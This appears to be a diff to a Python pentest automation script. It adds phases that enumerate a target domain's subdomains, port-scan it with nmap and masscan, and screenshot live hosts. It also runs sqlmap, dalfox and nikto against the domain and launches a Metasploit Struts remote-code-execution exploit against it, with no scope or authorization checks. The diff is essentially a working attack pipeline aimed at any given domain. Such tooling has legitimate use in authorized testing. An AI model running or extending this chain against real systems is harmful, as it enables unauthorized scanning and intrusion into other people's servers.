@@ -40,6 +40,43 @@ def run(command, output_file, task_name):
     except Exception as e:
         print(f"[!] Error in {task_name}: {e}")
 
+# === PHASE DEFINITIONS ===
+def recon_phase(domain, outdir):
+    recon_dir = os.path.join(outdir, "RECON")
+    os.makedirs(recon_dir, exist_ok=True)
+    run(f"subfinder -d {domain} -silent", os.path.join(recon_dir, "subfinder.txt"), "Subfinder")
+    run(f"amass enum -passive -d {domain}", os.path.join(recon_dir, "amass.txt"), "Amass Passive")
+    run(f"assetfinder --subs-only {domain}", os.path.join(recon_dir, "assetfinder.txt"), "Assetfinder")
+    run(f"httpx -l {recon_dir}/subfinder.txt -silent", os.path.join(recon_dir, "httpx.txt"), "Httpx Live Hosts")
+
+def port_scan_phase(domain, outdir):
+    scan_dir = os.path.join(outdir, "PORTSCAN")
+    os.makedirs(scan_dir, exist_ok=True)
+    run(f"nmap -sV -T4 {domain}", os.path.join(scan_dir, "nmap.txt"), "Nmap Scan")
+    run(f"masscan {domain} -p1-65535 --rate=1000", os.path.join(scan_dir, "masscan.txt"), "Masscan Full Range")
+
+def screenshot_phase(domain, outdir):
+    screen_dir = os.path.join(outdir, "SCREENSHOTS")
+    os.makedirs(screen_dir, exist_ok=True)
+    run(f"eyewitness --web -f {outdir}/RECON/httpx.txt -d {screen_dir} --no-prompt", os.path.join(screen_dir, "eyewitness.log"), "EyeWitness")
+    run(f"cat {outdir}/RECON/httpx.txt | aquatone -out {screen_dir}", os.path.join(screen_dir, "aquatone.log"), "Aquatone")
+
+def vuln_scan_phase(domain, outdir):
+    vuln_dir = os.path.join(outdir, "VULNERABILITIES")
+    os.makedirs(vuln_dir, exist_ok=True)
+    run(f"sqlmap -u https://{domain} --batch --crawl=1", os.path.join(vuln_dir, "sqlmap.txt"), "SQLMap")
+    run(f"dalfox url https://{domain} --output {vuln_dir}/dalfox.txt", os.path.join(vuln_dir, "dalfox.txt"), "Dalfox")
+    run(f"nikto -h https://{domain}", os.path.join(vuln_dir, "nikto.txt"), "Nikto")
+
+def exploitation_phase(domain, outdir):
+    exploit_dir = os.path.join(outdir, "EXPLOIT")
+    os.makedirs(exploit_dir, exist_ok=True)
+    run(f"msfconsole -q -x 'use exploit/multi/http/struts_dmi_rest_exec; set RHOSTS {domain}; run; exit'", os.path.join(exploit_dir, "msfconsole.txt"), "Metasploit Console")
+
+def zip_results(outdir):
+    archive_name = shutil.make_archive(outdir, 'zip', outdir)
+    print(f"[✔] Zipped results at: {archive_name}")
+
 # === INPUT ===
 def get_target(args):
     if args.domain:
